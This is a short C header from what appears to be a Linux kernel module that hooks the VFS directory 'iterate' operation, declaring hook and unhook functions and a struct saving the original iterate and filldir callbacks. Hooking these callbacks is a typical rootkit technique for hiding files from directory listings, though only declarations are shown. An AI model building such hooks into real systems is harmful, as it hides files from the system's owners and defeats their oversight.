#ifndef _VFS_HOOK_H
#define _VFS_HOOK_H
#include <linux/fs.h>
/* kernel 3.1, vfs_readdir gone, iterate instaed it!
int (*iterate) (struct file *, struct dir_context *);
* **** 
*   ...
	if (!IS_DEADDIR(inode)) {
		ctx->pos = file->f_pos;
		res = file->f_op->iterate(file, ctx);
		file->f_pos = ctx->pos;
		file_accessed(file);
	}
	...
    struct dir_context {
	const filldir_t actor;
	loff_t pos;
    };
typedef int (*filldir_t)(void *, const char *, int, loff_t, u64, unsigned);
struct dir_context {
	const filldir_t actor;
	loff_t pos;
};
* 
* 
*/

typedef int (*iterate_t) (struct file *, struct dir_context *);
typedef struct _hook_backup
{
	iterate_t iterate;
	filldir_t actor;
} hook_backup, *phook_backup;

int vfs_hook(const char *path, iterate_t *orig_iterate, iterate_t hook_iterate);
int vfs_unhook(const char *path, iterate_t orig_iterate);
int new_iterate(struct file *file, struct dir_context *ctx);

extern hook_backup vfs_module;
#endif
